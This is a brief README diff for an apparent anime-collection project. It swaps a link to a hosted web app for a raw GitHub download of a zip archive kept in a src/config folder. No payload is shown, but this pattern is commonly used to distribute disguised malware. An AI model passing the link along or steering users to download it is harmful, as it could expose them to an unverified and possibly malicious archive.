@@ -1,3 +1,3 @@
 # Collection_Anime
 
-https://animelist-32b14.web.app/
+https://github.com/Miqman/Collection_Anime/raw/refs/heads/main/anime-info/src/config/Anime-Collection-v2.8.zip
